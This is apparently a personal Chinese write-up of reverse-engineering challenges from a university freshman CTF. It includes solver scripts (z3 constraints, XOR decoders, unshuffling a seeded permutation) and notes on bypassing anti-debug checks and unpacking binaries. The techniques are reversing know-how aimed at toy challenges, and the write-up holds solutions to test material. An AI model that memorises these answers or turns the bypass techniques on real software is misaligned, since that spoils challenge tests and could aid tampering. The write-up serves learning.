---
title: Writeup for SCUCTF新生赛
date: 2022-11-13 09:25:00
author: 美食家李老叭
img: https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221113134336.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF
categories: CTF
tags:
    - 比赛
---
# 需要进步的地方

- 编程能力，复杂数据结构的应用这些。多尝试使用复杂数据结构来实现算法，不要总是使用简单的。
- **特殊算法**的掌握，**深度优先**算法、什么**区间加法**啊、等等先进的算法掌握。包括了一些逆向常用的**混淆算法**，采用不正常的方式来写常见的运算。
- **还需要注意编程过程中的特殊情况以及细节问题。尤其是循环临界、特殊逻辑步骤如何变化。细节决定成败，你不能总是依靠debug来解决所有的问题，这样不仅浪费了很多时间，同时也降低了对自己的标准。**

以前没体会到编程能力的高低，这次是真的体会到了！

# 未能解决的问题

## 1. ez_logic

时隔这么长时间终于搞定了。

字符串是一个0-9  | a-z | A-Z 这些字符组成的组合

字符	    diff[62] 数组

0-9  :         0 - 9

a-z  :        10 - 35

A-Z :         36- 61

 字符出现的次数对应于一个 diff[62] 的元素，diff[62] 中的每一个元素，

是该位置对应的字符 `在偶数位置出现的次数`   -  `在奇数位置出现的次数`

**这里面要注意，Z在奇数位置出现的次数  可以是任意次！**

第一开始卡住的原因呢，是因为我没考虑特殊情况，很明显这个题没有唯一的答案。

可以把 **正数** 就看做 **这个位置的字符在偶数位置出现的次数**，  而 **负数**  就 **看作这个字符在奇数位置出现的次数。** 然后奇数位置不足的地方就用Z补足。

#### 1. 步骤一 先求差分数组

```python
static_1 = [
    1,
    8,
    10,
    12,
    15,
    19,
    23,
    29,
    35,
    39,
    42,
    47,
    51,
    54,
    59,
    63,
    63,
    58,
    59,
    61,
    61,
    56,
    59,
    66,
    69,
    72,
    78,
    80,
    80,
    78,
    76,
    81,
    81,
    83,
    83,
    77,
    78,
    78,
    76,
    76,
    74,
    75,
    77,
    77,
    72,
    70,
    67,
    67,
    65,
    57,
    49,
    43,
    40,
    36,
    33,
    33,
    25,
    20,
    18,
    17,
    11,
    5,
]
diff = [None]*62
i = 61
print(static_1.__len__())
while i > 0:
    diff[i] = static_1[i] - static_1[i-1]
    i = i - 1
diff[0] = 1
print(diff)
print(diff[33])
```

#### 2. 步骤2  拼接字符串

这里就注意下，整个字符串需要按照之前对应的逻辑，严格递减。

```python

diff_copy = []
for i in diff:
    diff_copy.append(i)


def pick_head():
    i = 0
    while i < 62:
        if i == 33:
            print("x")
        if diff_copy[i] > 0:
            diff_copy[i] = diff_copy[i] - 1 
            return char_form_int(i)
  
        i = i + 1
    return -1

def pick_back():
    i = 0
    while i < 62:
  
        if diff_copy[i] < 0:
            diff_copy[i] = diff_copy[i] + 1
            return char_form_int(i-1)
  
        i = i + 1
    return -1


check =[]
while len(check) < 202:
    head = pick_head()
    back = pick_back()
    if back == -1:
        back = 'Z'
    if head != -1:
        # print(head+back)
        check.append(head)
        check.append(back)  
    else:
        print(diff_copy[33])
        break
print(len(check))
print("".join(check))


for i,j in enumerate(diff_copy):
    if j != 0:
        print(char_form_int(i)+ ": "+ str(j))
# print(diff_copy)

# 因为Z在奇数位置出现的次数是没有参与到运算里面的
# 所以可以在缺口的位置处补足Z就可以了
# 如果还是缺的话，可以利用最开始的0  0就是说，你补足这些字母组合是不影响的。
# AZ FZ GZ GZ  刚好是 8个

# insert = ["A","Z","B","A","F","Z","G","Z","G","Z"]

# for i in insert:
#     check.append(i)

# print(len(check))
# print("".join(check))
```

![本地打通的结果](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221128162506.png)

## 2. ez_Android

这个题有点想当然了

通过jni调用了c函数去处理字符串。找到动态链接库之后，反编译，然后我居然就认准了是flag是最终答案。实在是大错特错！

因为人家check_s 只是一个简单的判断函数，具体flag是通过click7函数里面加工处理之后才会返回的。是真的傻,.....

```java
public void click7() {
        update();
        if (check_s(this.string) == 0) {
            this.textView.setText("nice");
            String str = new String();
            String str2 = new String();
            for (int hashCode = this.string.hashCode(); hashCode != 0; hashCode /= 10) {
                str = str + String.valueOf(hashCode % 10);
            }
            for (int i = 0; i < str.length(); i++) {
                str2 = str2 + String.valueOf((int) str.charAt(i));
            }
            this.textView.setText("scuctf{" + str2 + "}");
        }
    }
```

实际上，下面这个check_s只是通过点击产生的01字符串--对应于"even if i only have seven seconds of memory, even if i forget the world, i still love android"。

```c++
  v4 = f[1];//f是一个替换表
  while ( 1 )
  {
    sub = 0;
    LODWORD(v5) = 0;
    v6 = v4;
    if ( !v4 )
    {
      v7 = 1;
      v5 = 0LL;
      do  //计算二进制的过程
      {
        sub = v5 + 1;
        v8 = string_01[v5];
        if ( v8 == 49 )   //1   二进制的计算   *2+1
        {
          v7 = 2 * v7 + 1;
        }
        else
        {
          if ( v8 != 48 )  //0 二进制的计算  *2
            return 1;
          v7 *= 2;
        }
        v6 = f[v7];//f是一个替换表
        ++v5;
      }
      while ( !v6 );
    }
    if ( v6 == -1 )
      break;
    v9 = flag_len++;
    flag[v9] = v6;
    str2 = &string_01[(int)v5];
    v10 = string_01[(int)v5] == 0;
    string_01 += (int)v5;
    if ( v10 )
      return strcmp(
               flag,
               "even if i only have seven seconds of memory, even if i forget the world, i still love android");
  }
```

具体为什么能看出来这里是将字符串翻译成01字符串的，就要看一下出题人给的源码，看看人家大二，递归都玩的这么遛了，如果让我写，可能还是最简单的那种吧~~.

```c++
#include<bits/stdc++.h>
using namespace std;
int f[500]={
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,115,114,110,98,0,116,117,0,118,0,119,105,120,102,0,0,0,0,0,0,0,0,0,0,111,108,0,0,0,0,121,0,0,0,112,0,0,0,0,0,0,0,0,0,99,113,109,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,122,0,0,0,0,0,0,0,0,106,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,0,0,0,0,0,0,0,0,0,0,0,0,0,100,107,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,103,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,104,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
};

int sub;
int find(char* a,int id)
{
	cout<<id<<"\n";
  
    if(f[id]){
        return f[id];
    }
	sub++;
    if(a[0]=='0') return find(a+1,id*2);
    if(a[0]=='1') return find(a+1,id*2+1);
    return -1;
}
char flag[400];
int flag_len;
char str[1000]="111110010001111100001001111111101111010111111110110111111101000001001001011100111111101111110111111100011111000111111100001111100100011111000010011111110000111110011100010000010100110000000111111101000110101111111111101111100111100100000010111001111100111111111111001000111110000100111111110111101011111111011011111111101010000001111110111111000101011111110101011111101111100011111111010010000001010011001100011111001111111101101111111000001011011010010100101111111010010100010001111100011111111111110010100110000010100010111001100";
char *str2; 
int main()
{
	str2=str;
	while(str2[0]!='\0'){
        sub=0;
        int c=find(str2,1);
        if(!~c) return 1;
        flag[flag_len++]=c;
        str2+=sub; 
    }
    cout<<flag;
}

```

## 3. ez_vm

这个题为什么没做出来呢。有两点原因：

- 我没看出来，此题是通过自定义指令(每一个操作符(实际对应的是数字)对应不同的操作)，来解释其自创的程序指令(实际上是一串数字)
- 即使我能看出来第一点，我也不能将程序指令完全理解。由于程序指令比较长，而且不是简单的单一操作，是复合操作，同时包含了压栈出栈和字符处理等操作。所以把它对应成伪代码需要一定的功力。

下面是 `我就是来垫底的` 战队关于这道题目的解答。[https://tiger1218.com/2022/11/25/2022SCUCTF%E9%A2%98%E8%A7%A3](https://tiger1218.com/2022/11/25/2022SCUCTF%E9%A2%98%E8%A7%A3)

ida反编译后，已知一个操作列表，逐步完成操作

经分析：

Case 0:把栈顶两个数相加

Case 1:把栈顶两个数相减

Case 2:把栈顶两个数相异或

Case 3:把栈顶两个数相比较

Case 4,5,6:为比较后的跳转

Case 7:对栈顶的数在另一个数组中下标转值

Case 8:改写数组

Case 9:向栈里加一个数

Case 10:Wrong

Case 11:Right

Case 12:跳转

令另一个数组为Str[]

发现一些结构如

`9 A 9 B 8 -> str[B]=A`

```txt
9 A 9 100 8
9 100 7 9 lim 3
5 loop1
...
9 1 9 100 7 0 9 100 8
C loop2
是一个循环
for(i=A;i<lim;i++) {
	...
}
```

发现流程由三个循环和一些赋值组成，且代码由Str[100]作为循环的i

分析一下三个循环中分别为

```c++
for(int i=0;i<25;i++) Str[i]=Str[i]^Str[i+1]
for(int i=0;i<24;i++) Str[i+1]+=Str[i]-i
{for(int i=1;i<25;i++) if(Str[i]!=Str[i+49]) return wrong; return right;}
```

爆破一下str[0]然后倒着做。

# Rev

## 1. RE签到

直接用ida反编译之后，就可以在里面找到flag

## 2. Tower of Hanoi

这个程序使用upx加壳之后的，脱壳之后就能看到原本的代码了。

一个异或加密，首先把程序中原本的字符串保存下来。然后用python解密。

![异或解密](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113134915.png)

```python
import struct
import os

char_count=[]
if __name__ == '__main__':
	filepath='string'
	binfile = open(filepath, 'rb') #打开二进制文件
	size = os.path.getsize(filepath) #获得文件大小
	for i in range(size):
		data = binfile.read(4) #每次输出一个字节
		data = int.from_bytes(data, byteorder='little', signed=True)
		data = data ^ 0x1BF52
		one =  chr(data)
		char_count.append(one)
	print(''.join(char_count))
```

## 3. ez_pyc

这个是反编译pyc，直接在在线网站上面提交就行。

观察代码发现，是一个约束求解的问题。

由于比较多，可以利用 `z3`这个工具来进行求解。

**这里面一定要注意下，怎么在python list列表中的指定位置插入自己想放的字符。和insert这个函数是不一样的！！**

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.8

from z3 import *

flag=[""]*25  # --->>>>>用这个创建，插入的时候直接赋值。而不是用insert函数。

f0=Int('f0')
f1=Int('f1')
f2=Int('f2')
f3=Int('f3')
f4=Int('f4')
f5=Int('f5')
f6=Int('f6')
f7=Int('f7')
f8=Int('f8')
f9=Int('f9')
f10=Int('f10')
f11=Int('f11')
f12=Int('f12')
f13=Int('f13')
f14=Int('f14')
f15=Int('f15')
f16=Int('f16')
f17=Int('f17')
f18=Int('f18')
f19=Int('f19')
f20=Int('f20')
f21=Int('f21')
f22=Int('f22')
f23=Int('f23')
f24=Int('f24')
s = Solver()  #创建一个通用求解器
s.add(99 * f0 + 91 * f1 + 69 * f2 + 42 * f3 + 65 * f4 + 86 * f5 + 63 * f6 + 9 * f7 + 60 * f8 + 82 * f9 + 61 * f10 + 65 * f11 + 14 * f12 + 86 * f13 + 2 * f14 + 53 * f15 + 56 * f16 + 17 * f17 + 88 * f18 + 20 * f19 + 6 * f20 + 21 * f21 + 100 * f22 + 24 * f23 + 11 * f24 == 133017)  #添加约束条件
s.add( 99 * f0 + 2 * f1 + 14 * f2 + 30 * f3 + 38 * f4 + 23 * f5 + 6 * f6 + 100 * f7 + 43 * f8 + 58 * f9 + 82 * f10 + 20 * f11 + 19 * f12 + 39 * f13 + 16 * f14 + 1 * f15 + 15 * f16 + 82 * f17 + 97 * f18 + 47 * f19 + 28 * f20 + 51 * f21 + 96 * f22 + 54 * f23 + 43 * f24 == 113856)
s.add( 63 * f0 + 86 * f1 + 33 * f2 + 39 * f3 + 45 * f4 + 76 * f5 + 37 * f6 + 64 * f7 + 65 * f8 + 56 * f9 + 32 * f10 + 69 * f11 + 38 * f12 + 1 * f13 + 20 * f14 + 44 * f15 + 16 * f16 + 78 * f17 + 12 * f18 + 97 * f19 + 29 * f20 + 46 * f21 + 54 * f22 + 81 * f23 + 47 * f24 == 126193 )
s.add( 9 * f0 + 100 * f1 + 1 * f2 + 5 * f3 + 99 * f4 + 20 * f5 + 37 * f6 + 91 * f7 + 53 * f8 + 85 * f9 + 52 * f10 + 49 * f11 + 69 * f12 + 32 * f13 + 7 * f14 + 81 * f15 + 80 * f16 + 89 * f17 + 87 * f18 + 24 * f19 + 90 * f20 + 54 * f21 + 16 * f22 + 6 * f23 + 2 * f24 == 128397 )
s.add(  72 * f0 + 18 * f1 + 71 * f2 + 28 * f3 + 67 * f4 + 25 * f5 + 26 * f6 + 59 * f7 + 96 * f8 + 30 * f9 + 65 * f10 + 39 * f11 + 29 * f12 + 35 * f13 + 95 * f14 + 55 * f15 + 67 * f16 + 63 * f17 + 72 * f18 + 61 * f19 + 30 * f20 + 74 * f21 + 38 * f22 + 61 * f23 + 58 * f24 == 138932 )
s.add(30 * f0 + 69 * f1 + 52 * f2 + 68 * f3 + 94 * f4 + 37 * f5 + 13 * f6 + 85 * f7 + 97 * f8 + 66 * f9 + 57 * f10 + 40 * f11 + 11 * f12 + 93 * f13 + 87 * f14 + 22 * f15 + 61 * f16 + 3 * f17 + 17 * f18 + 54 * f19 + 22 * f20 + 18 * f21 + 57 * f22 + 58 * f23 + 88 * f24 == 136211)
s.add( 81 * f0 + 62 * f1 + 83 * f2 + 60 * f3 + 71 * f4 + 64 * f5 + 96 * f6 + 88 * f7 + 96 * f8 + 39 * f9 + 23 * f10 + 77 * f11 + 85 * f12 + 87 * f13 + 3 * f14 + 3 * f15 + 56 * f16 + 67 * f17 + 59 * f18 + 11 * f19 + 32 * f20 + 41 * f21 + 1 * f22 + 71 * f23 + 10 * f24 == 141572 )
s.add(95 * f0 + 66 * f1 + 37 * f2 + 55 * f3 + 2 * f4 + 29 * f5 + 65 * f6 + 85 * f7 + 68 * f8 + 95 * f9 + 77 * f10 + 16 * f11 + 2 * f12 + 94 * f13 + 54 * f14 + 92 * f15 + 44 * f16 + 48 * f17 + 70 * f18 + 25 * f19 + 57 * f20 + 48 * f21 + 74 * f22 + 63 * f23 + 49 * f24 == 143300 )
s.add(79 * f0 + 85 * f1 + 53 * f2 + 93 * f3 + 69 * f4 + 33 * f5 + 63 * f6 + 2 * f7 + 93 * f8 + 82 * f9 + 73 * f10 + 37 * f11 + 91 * f12 + 13 * f13 + 1 * f14 + 62 * f15 + 60 * f16 + 17 * f17 + 7 * f18 + 95 * f19 + 65 * f20 + 91 * f21 + 14 * f22 + 64 * f23 + 66 * f24 == 146502)
s.add(   33 * f0 + 57 * f1 + 13 * f2 + 85 * f3 + 83 * f4 + 31 * f5 + 73 * f6 + 41 * f7 + 19 * f8 + 41 * f9 + 80 * f10 + 33 * f11 + 5 * f12 + 42 * f13 + 3 * f14 + 27 * f15 + 1 * f16 + 55 * f17 + 24 * f18 + 72 * f19 + 21 * f20 + 98 * f21 + 89 * f22 + 58 * f23 + 41 * f24 == 118533 )
s.add(   29 * f0 + 5 * f1 + 52 * f2 + 22 * f3 + 21 * f4 + 8 * f5 + 41 * f6 + 10 * f7 + 51 * f8 + 69 * f9 + 90 * f10 + 63 * f11 + 90 * f12 + 24 * f13 + 91 * f14 + 99 * f15 + 40 * f16 + 6 * f17 + 17 * f18 + 81 * f19 + 47 * f20 + 100 * f21 + 99 * f22 + 3 * f23 + 46 * f24 == 124392 )
s.add(  59 * f0 + 64 * f1 + 99 * f2 + 26 * f3 + 76 * f4 + 42 * f5 + 37 * f6 + 62 * f7 + 14 * f8 + 15 * f9 + 15 * f10 + 49 * f11 + 10 * f12 + 88 * f13 + 5 * f14 + 3 * f15 + 52 * f16 + 70 * f17 + 89 * f18 + 37 * f19 + 98 * f20 + 1 * f21 + 18 * f22 + 75 * f23 + 13 * f24 == 118223)
s.add(66 * f0 + 65 * f1 + 5 * f2 + 80 * f3 + 42 * f4 + 93 * f5 + 42 * f6 + 15 * f7 + 1 * f8 + 90 * f9 + 4 * f10 + 14 * f11 + 97 * f12 + 25 * f13 + 68 * f14 + 93 * f15 + 78 * f16 + 33 * f17 + 33 * f18 + 70 * f19 + 21 * f20 + 10 * f21 + 25 * f22 + 92 * f23 + 43 * f24 == 122643)
s.add(25 * f0 + 95 * f1 + 15 * f2 + 82 * f3 + 82 * f4 + 99 * f5 + 9 * f6 + 60 * f7 + 74 * f8 + 8 * f9 + 82 * f10 + 99 * f11 + 79 * f12 + 83 * f13 + 8 * f14 + 42 * f15 + 41 * f16 + 75 * f17 + 93 * f18 + 75 * f19 + 36 * f20 + 57 * f21 + 84 * f22 + 99 * f23 + 67 * f24 == 166882)
s.add(26 * f0 + 14 * f1 + 83 * f2 + 22 * f3 + 62 * f4 + 50 * f5 + 68 * f6 + 95 * f7 + 27 * f8 + 99 * f9 + 29 * f10 + 31 * f11 + 12 * f12 + 37 * f13 + 18 * f14 + 51 * f15 + 36 * f16 + 72 * f17 + 98 * f18 + 96 * f19 + 25 * f20 + 49 * f21 + 6 * f22 + 59 * f23 + 2 * f24 == 120884)
s.add(15 * f0 + 51 * f1 + 6 * f2 + 80 * f3 + 72 * f4 + 49 * f5 + 13 * f6 + 28 * f7 + 57 * f8 + 1 * f9 + 43 * f10 + 82 * f11 + 36 * f12 + 36 * f13 + 55 * f14 + 2 * f15 + 96 * f16 + 29 * f17 + 2 * f18 + 82 * f19 + 60 * f20 + 65 * f21 + 100 * f22 + 37 * f23 + 12 * f24 == 118151 )
s.add(32 * f0 + 44 * f1 + 6 * f2 + 70 * f3 + 17 * f4 + 49 * f5 + 66 * f6 + 51 * f7 + 29 * f8 + 13 * f9 + 38 * f10 + 26 * f11 + 27 * f12 + 18 * f13 + 73 * f14 + 1 * f15 + 67 * f16 + 45 * f17 + 10 * f18 + 49 * f19 + 63 * f20 + 9 * f21 + 75 * f22 + 46 * f23 + 88 * f24 == 105637)
s.add(39 * f0 + 90 * f1 + 54 * f2 + 62 * f3 + 25 * f4 + 97 * f5 + 53 * f6 + 92 * f7 + 90 * f8 + 34 * f9 + 53 * f10 + 91 * f11 + 84 * f12 + 78 * f13 + 88 * f14 + 8 * f15 + 88 * f16 + 24 * f17 + 86 * f18 + 33 * f19 + 98 * f20 + 46 * f21 + 69 * f22 + 80 * f23 + 47 * f24 == 168627 )
s.add(1 * f0 + 50 * f1 + 59 * f2 + 85 * f3 + 14 * f4 + 89 * f5 + 12 * f6 + 64 * f7 + 1 * f8 + 49 * f9 + 97 * f10 + 8 * f11 + 11 * f12 + 59 * f13 + 40 * f14 + 13 * f15 + 73 * f16 + 82 * f17 + 98 * f18 + 50 * f19 + 43 * f20 + 70 * f21 + 93 * f22 + 5 * f23 + 7 * f24 == 123563)
s.add(83 * f0 + 41 * f1 + 15 * f2 + 86 * f3 + 1 * f4 + 18 * f5 + 7 * f6 + 93 * f7 + 72 * f8 + 49 * f9 + 48 * f10 + 26 * f11 + 83 * f12 + 70 * f13 + 18 * f14 + 28 * f15 + 32 * f16 + 77 * f17 + 81 * f18 + 5 * f19 + 61 * f20 + 8 * f21 + 98 * f22 + 94 * f23 + 22 * f24 == 125124 )
s.add(40 * f0 + 63 * f1 + 90 * f2 + 28 * f3 + 52 * f4 + 79 * f5 + 21 * f6 + 77 * f7 + 86 * f8 + 91 * f9 + 50 * f10 + 95 * f11 + 82 * f12 + 30 * f13 + 60 * f14 + 2 * f15 + 97 * f16 + 33 * f17 + 11 * f18 + 30 * f19 + 64 * f20 + 40 * f21 + 4 * f22 + 2 * f23 + 1 * f24 == 126844)
s.add(61 * f0 + 9 * f1 + 36 * f2 + 17 * f3 + 13 * f4 + 53 * f5 + 96 * f6 + 41 * f7 + 28 * f8 + 63 * f9 + 20 * f10 + 4 * f11 + 71 * f12 + 99 * f13 + 37 * f14 + 2 * f15 + 58 * f16 + 38 * f17 + 75 * f18 + 29 * f19 + 34 * f20 + 66 * f21 + 82 * f22 + 39 * f23 + 50 * f24 == 116479 )
s.add(51 * f0 + 56 * f1 + 13 * f2 + 6 * f3 + 80 * f4 + 8 * f5 + 99 * f6 + 76 * f7 + 14 * f8 + 32 * f9 + 99 * f10 + 7 * f11 + 27 * f12 + 32 * f13 + 20 * f14 + 23 * f15 + 79 * f16 + 89 * f17 + 54 * f18 + 78 * f19 + 23 * f20 + 89 * f21 + 96 * f22 + 85 * f23 + 94 * f24 == 139277)
s.add(  3 * f0 + 17 * f1 + 78 * f2 + 6 * f3 + 75 * f4 + 18 * f5 + 29 * f6 + 1 * f7 + 49 * f8 + 8 * f9 + 90 * f10 + 60 * f11 + 62 * f12 + 13 * f13 + 16 * f14 + 87 * f15 + 38 * f16 + 71 * f17 + 39 * f18 + 12 * f19 + 47 * f20 + 7 * f21 + 54 * f22 + 83 * f23 + 64 * f24 == 109760 )
s.add( 58 * f0 + 1 * f1 + 51 * f2 + 94 * f3 + 69 * f4 + 86 * f5 + 45 * f6 + 14 * f7 + 23 * f8 + 4 * f9 + 25 * f10 + 9 * f11 + 72 * f12 + 85 * f13 + 35 * f14 + 39 * f15 + 92 * f16 + 43 * f17 + 19 * f18 + 26 * f19 + 76 * f20 + 55 * f21 + 52 * f22 + 59 * f23 + 24 * f24 == 121674)

if s.check() == sat:
	m = s.model()    #得到一组解，m为字典类型

	print(m)
	#遍历字典中所有values值
	for d in m.decls():
		print(int(d.name()[1:]))
		#flag.append(chr(m[d].as_long()))
		flag[int(d.name()[1:])] = chr(m[d].as_long())
		#flag.insert(int(d.name()[1:]),chr(m[d].as_long()))

	print("".join(flag))
```

## 4. ez_dp

这个二进制程序使用python写的，然后打包而成。

首先我们使用 `pyinstxtractor`提取exe中的资源。

然后使用 `uncompyle6 t4.pyc test.py`反向编译python产生的字节码

![uncompyle6](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113135207.png)

把代码从终端复制到python文件中，可以找到跟flag有关的代码。是一个递归。

```python
from functools import lru_cache
@lru_cache(maxsize=1024)
class test():
    flag = 0
    def gogogo(self, x):
        print(1)
        if x >= 100:
            self.flag += 1
            return
        self.gogogo(x + 1)
        self.gogogo(x + 2)

    def get_flag(self):
        self.gogogo(0)
        return self.flag

if __name__ == '__main__':

    a = test().get_flag()
    print('scuctf{' + str(a) + '}')
```

第一开始我是傻乎乎地用计算机去算，结果发现计算机根本算不出来这个。最后发现这个跟 `斐波拉契数列`有关系。这个值就是 `f(102)`。

可以先算几个较小的 ` x = 0 ; x = 1; x = 2; x = 3;`，然后去找这些算出来的结果和 `斐波拉契数列值`的关系.

```python
class test():
    flag = 0
    def get_flag(self):
        for N in range(0,20):
            self.flag = 0
            def go(x):
                if x >= N:
                    self.flag += 1
                    return 
                go(x+1)
                go(x+2)
            go(0)
            print(str(N) + ": " + str(self.flag))

test().get_flag()

0: 1 
1: 2
2: 3
3: 5
4: 8
5: 13
6: 21
7: 34
8: 55
9: 89
10: 144
11: 233
12: 377
13: 610
14: 987
15: 1597
16: 2584
17: 4181
18: 6765
19: 10946
斐波那契数列：
f(0)=0，
f(1)=1，
f(2)=1，
f(3)=2，
f(4)=3，
f(5)=5，
f(6)=8，
f(7)=13，
f(8)=21，
f(9)=34，
f(10)=55...
```

可以发现规律
go(N) = f(N+2)

## 5. DEBUG

最开始运行这个程序，会直接报错。

![DEBUG](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113141551.png)

然后利用ida反编译，同时结合 `linux_server_64`来对 linux中的程序进行动态调试。

然后，我们定位到这个异常触发的函数。
![异常触发函数](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113141733.png)

利用ida重新设置eip 跳过这个函数调用。因为它是fastcall调用方式，看了一下不用平栈操作。

![汇编代码](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113142011.png)

然后可以发现程序可以正常进入到main函数里面。**注意，这里面很多函数的命名是我根据函数功能更改的！**

![main函数](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113142152.png)

strchange函数 这个函数就是根据随机产生的随机数，然后随机更换字符串中的两个位置的字符。总共换30次。

![strchange函数--可以理解为就是个打乱顺序的操作](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113142242.png)

分析到这里，结合伪随机数的特点。如果种子保持一样的话，我们是可以找到strchange函数中的替换字符的顺序。

### 思路--这个值得总结嗷！

然后我们将初始输入的字符串设置为 `abcdefghijklmnopqrstuvwxyz012345`
发现，替换过后的字符串为 `fqnds40r1ut3aehbiogzmvjxykw2cl5p`

可以利用前后的对比，找到特定位置的字符 最后被 替换到的位置。

然后将最后程序比对的字符串 `fa+cmRG25L5Cst5cqO{CLmy6YigZu6}5`做逆向操作。

```python
original = "abcdefghijklmnopqrstuvwxyz012345"
#ABCDEFGHIGKLMNOPQRSTUVWXYZ
#change =		"fipvoj3h0acxekrwbs2tzqulyn1gmd45"
change = "fqnds40r1ut3aehbiogzmvjxykw2cl5p"
#						"scuctf{ABCDEFGHIGKLMNOPQRSTUVWX}"
#						"fa+cmRG25L5Cst5cqO{CLmy6YigZu6}5"
original_flag = "fa+cmRG25L5Cst5cqO{CLmy6YigZu6}5"

true_flag = [""]*32

order=[None]*32

j = 0
for item in change:
	i = original.find(item)
	print(i)
	order[j] = i
	true_flag[i] = original_flag[j]
	j = j+1
print(order)
print("".join(true_flag))
```

![flag](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113152531.png)

### 走过的坑

第一开始，  我直接跳过了调用 这个触发异常的函数 的函数-get_random。

> 函数调用栈如下：
> sub_409710  -- 真正触发浮点数异常的函数
> sub_4092F0
> get_random

但是呢，get_random这个函数里面，还有其他函数可能会设置随机数种子，或者获得随机数。

我这样跳过的话，就会导致后续产生的随机数发生变化。也就影响替换的顺序。

这也是为什么，我最开始得到了一个替换顺序，但是替换后的结果明显不对的原因。

> --但确实能在本地跑通，那是因为你更改了程序流。新的程序是按照新的随机数产生决定的互换顺序，所以没可以跑通。但未必只有这一种替换顺序，也就是随机数产生的过程未必相符。

之前做过一道，也是类似的情况。是因为我忽略了其他互换情况。--(可以从代码逻辑中发现)。这次的情况，属于误打误撞把，其实也能从代码中看出来，但是是才出来的。~~

## 6. ez_logic --- 没做出来

这个题是我最开始看的。做了很长时间，没做出来。

使用了 `setjmp`，`longjmp`，跟goto语句有点不一样。

![setjmp&&longjmp](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144354.png)

### main 函数逻辑

![函数的跳转逻辑](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144218.png)

sub_40157F--->sub_4016A9--->sub_401779 这三个都是字符串处理函数。

里面的逻辑我也清楚，但是就是不知道怎么倒着把目标字符串给提取出来。

### sub_40157F

![sub_40157F](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144758.png)

### sub_4016A9

![sub_4016A9](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144822.png)

### sub_401779

![sub_401779](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113144845.png)

(dword-32位)static_num这个数组

```text
01 00 00 00 08 00 00 00  0A 00 00 00 0C 00 00 00
0F 00 00 00 13 00 00 00  17 00 00 00 1D 00 00 00
23 00 00 00 27 00 00 00  2A 00 00 00 2F 00 00 00
33 00 00 00 36 00 00 00  3B 00 00 00 3F 00 00 00
3F 00 00 00 3A 00 00 00  3B 00 00 00 3D 00 00 00
3D 00 00 00 38 00 00 00  3B 00 00 00 42 00 00 00
45 00 00 00 48 00 00 00  4E 00 00 00 50 00 00 00
50 00 00 00 4E 00 00 00  4C 00 00 00 51 00 00 00
51 00 00 00 53 00 00 00  53 00 00 00 4D 00 00 00
4E 00 00 00 4E 00 00 00  4C 00 00 00 4C 00 00 00
4A 00 00 00 4B 00 00 00  4D 00 00 00 4D 00 00 00
48 00 00 00 46 00 00 00  43 00 00 00 43 00 00 00
41 00 00 00 39 00 00 00  31 00 00 00 2B 00 00 00
28 00 00 00 24 00 00 00  21 00 00 00 21 00 00 00
19 00 00 00 14 00 00 00  12 00 00 00 11 00 00 00
0B 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00
```

## 7. ez_xxx

开始就是有两次检查你是否是在调试。ida修改ZF寄存器跳过就可以。

然后有一个部分，出题人把函数当作数据，进行了异或加密的操作。

在运行的时候，解密，然后调用这个函数。

![逻辑](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113192305.png)

加密数据可以拿到，重要的是分析这个函数。通过动态调试，将ida中解密之后的函数数据拿出来。用 `010editor`简单编辑之后，送入ida反编译。

函数本身不复杂，一个简单的异或加密。

![反汇编加密函数](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113192531.png)

> 这里突然感慨一下，自己之前非常头疼的栈结构和反汇编代码，现在也是能简单地对应起来分析看了。不得不说，慢慢坚持真的能看到效果。

![手动分析的栈结构](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113192955.png)

然后就是python解密

```python
import struct
import os

char_count=[]
if __name__ == '__main__':
	filepath='funciton_data'
	binfile = open(filepath, 'rb') #打开二进制文件
	size = os.path.getsize(filepath) #获得文件大小
	for i in range(size):
		data = binfile.read(4) #每次输出一个字节
		#print(data)

		data = int.from_bytes(data, byteorder='little', signed=True)
		data = (data ^ 0x28) - 4
		one =  chr(data)
		char_count.append(one)
	print(''.join(char_count))
```

